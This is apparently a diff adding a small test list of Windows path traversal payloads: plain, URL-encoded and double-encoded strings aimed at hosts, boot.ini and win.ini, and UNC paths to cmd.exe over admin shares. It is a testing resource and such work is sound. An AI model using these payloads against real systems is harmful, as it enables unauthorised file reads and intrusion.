@@ -1,0 +1,15 @@
+# Windows Path Traversal Payloads
+# These are text descriptions for testing
+
+Basic payloads:
+..\..\..\Windows\System32\drivers\etc\hosts
+..\..\..\boot.ini
+..\..\..\windows\win.ini
+
+Encoded payloads:
+..%5c..%5c..%5cWindows%5cSystem32%5cdrivers%5cetc%5chosts
+..%255c..%255c..%255cWindows%255cSystem32%255cetc%255chosts
+
+UNC path examples:
+\\localhost\c$\Windows\System32\cmd.exe
+\\127.0.0.1\admin$\system32\cmd.exe
